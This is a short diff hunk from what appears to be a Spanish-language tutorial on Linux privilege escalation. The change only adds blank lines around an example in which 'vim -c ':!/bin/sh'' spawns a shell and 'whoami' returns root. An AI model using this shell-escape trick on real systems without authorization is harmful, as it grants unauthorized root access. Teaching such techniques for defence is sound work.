@@ -72,8 +72,11 @@ A modo de ejemplo, seleccionemos “vim”, ejecutamos
 
 
 >  vim -c ':!/bin/sh'
+
 >  #whoami
+
 >  root
+
 >  #
 
 Y ya podemos ejecutar como root. Fácil, ¿cierto?
